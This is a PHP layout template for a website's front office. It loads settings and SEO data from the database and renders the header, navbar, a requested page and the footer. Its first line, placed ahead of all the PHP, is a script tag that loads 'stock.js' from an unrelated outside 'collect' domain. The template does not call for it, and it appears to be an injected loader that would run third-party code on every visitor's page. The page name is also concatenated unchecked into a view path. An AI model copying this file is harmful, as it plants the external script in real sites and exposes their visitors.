<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $url="https://templates.hibootstrap.com/techex/default/";?>
<?php $urlCss = base_url().'assets/fo/css/';?>
<?php $urlJs = base_url().'assets/fo/js/';?>
<?php $socmed = $this->M_crud->read_data("socmed","*","status=1"); ?>
<?php $pengaturan = $this->M_crud->get_data("pengaturan","*");
$gambar=explode(",",$pengaturan['gambar']);
$seo=[];
foreach (json_decode($pengaturan['seo'],true) as $val){
    $seo[]=$val["value"];
}
?>

<?php view("frontoffice/layout/header",["socmed"=>$socmed,"gambar"=>$gambar,"pengaturan"=>$pengaturan,"seo"=>$seo]) ?>
<?php view("frontoffice/layout/navbar",["gambar"=>$gambar]) ?>
<?php view("frontoffice/pages/".$page,["pengaturan"=>$pengaturan]) ?>
<?php view("frontoffice/layout/footer") ?>